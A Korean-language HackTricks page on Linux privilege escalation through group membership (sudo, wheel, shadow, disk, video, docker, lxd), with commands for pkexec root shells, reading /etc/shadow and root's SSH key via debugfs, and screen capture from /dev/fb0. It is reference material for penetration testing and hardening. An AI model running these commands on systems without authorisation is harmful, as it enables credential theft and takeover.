<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


# Sudo/Admin 그룹

## **PE - 방법 1**

**가끔**, **기본적으로 \(또는 일부 소프트웨어가 필요로 하는 경우\)** **/etc/sudoers** 파일 내에 다음과 같은 줄들을 찾을 수 있습니다:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
이는 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있다는 것을 의미**합니다.

이 경우, **루트로 전환하기 위해 다음을 실행**할 수 있습니다:
```text
sudo su
```
## PE - 방법 2

모든 suid 바이너리를 찾고, 바이너리 **Pkexec**이 있는지 확인하세요:
```bash
find / -perm -4000 2>/dev/null
```
만약 바이너리 pkexec가 SUID 바이너리이고 sudo 또는 admin에 속해 있다면, pkexec를 사용하여 바이너리를 sudo 권한으로 실행할 수 있을 것입니다.
다음의 내용을 확인하세요:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
다음에서는 어떤 그룹이 **pkexec**를 실행할 수 있는지와 **기본적으로** 일부 Linux에서 **sudo 또는 admin** 그룹 중 일부가 나타날 수 있는 것을 확인할 수 있습니다.

**루트로 전환하려면 다음을 실행하세요**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
만약 **pkexec**를 실행하려고 하면 다음과 같은 **오류**가 발생합니다:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**권한이 없는 것이 아니라 GUI 없이 연결되지 않았기 때문입니다**. 이 문제에 대한 해결책은 여기에 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2개의 다른 ssh 세션이 필요**합니다:

{% code title="세션1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="세션2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# 휠 그룹

**가끔**, **기본적으로** **/etc/sudoers** 파일 안에 다음과 같은 줄을 찾을 수 있습니다:
```text
%wheel	ALL=(ALL:ALL) ALL
```
이는 **wheel 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있다는 것을 의미**합니다.

이 경우, **루트가 되기 위해 다음을 실행**할 수 있습니다:
```text
sudo su
```
# 그림자 그룹

**그림자 그룹**의 사용자는 **/etc/shadow** 파일을 **읽을 수 있습니다**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
그래서, 파일을 읽고 일부 해시를 **해독해보세요**.

# 디스크 그룹

이 권한은 기계 내의 모든 데이터에 액세스할 수 있기 때문에 거의 **루트 액세스와 동등**합니다.

파일: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
다음은 debugfs를 사용하여 파일을 작성할 수도 있다는 것을 알아두세요. 예를 들어, `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음과 같이 할 수 있습니다:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
그러나, 만약 당신이 root 소유의 파일\(예: `/etc/shadow` 또는 `/etc/passwd`\)을 **작성하려고 한다면**, "**Permission denied**" 오류가 발생할 것입니다.

# Video 그룹

`w` 명령어를 사용하여 **시스템에 로그인한 사용자를 찾을 수** 있으며, 다음과 같은 출력 결과를 보여줍니다:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**은 사용자 **yossi가 물리적으로** 기계의 터미널에 로그인되어 있는 것을 의미합니다.

**video 그룹**은 화면 출력을 볼 수 있는 권한을 가지고 있습니다. 기본적으로 화면을 관찰할 수 있습니다. 이를 위해서는 현재 화면의 이미지를 원시 데이터로 캡처하고 화면이 사용하는 해상도를 얻어야 합니다. 화면 데이터는 `/dev/fb0`에 저장될 수 있으며, 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 확인할 수 있습니다.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**원본 이미지**를 **열기** 위해 **GIMP**를 사용할 수 있으며, **`screen.raw`** 파일을 선택한 다음 파일 유형으로 **Raw 이미지 데이터**를 선택합니다:

![](../../.gitbook/assets/image%20%28208%29.png)

그런 다음 화면에서 사용하는 너비와 높이를 수정하고 다른 이미지 유형을 확인합니다(화면을 더 잘 보여주는 것을 선택합니다):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root 그룹

기본적으로 **root 그룹의 구성원**은 **일부 서비스 구성 파일**이나 **라이브러리 파일** 또는 **기타 흥미로운 항목**을 수정할 수 있는 권한을 가질 수 있습니다. 이를 통해 권한을 상승시킬 수 있습니다...

**root 그룹 구성원이 수정할 수 있는 파일을 확인하세요**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker 그룹

호스트 머신의 루트 파일 시스템을 인스턴스의 볼륨에 마운트할 수 있으므로, 인스턴스가 시작되면 해당 볼륨에 `chroot`가 즉시 로드됩니다. 이를 통해 머신에서 root 권한을 얻을 수 있습니다.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd 그룹

[lxc - Privilege Escalation](lxd-privilege-escalation.md)



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
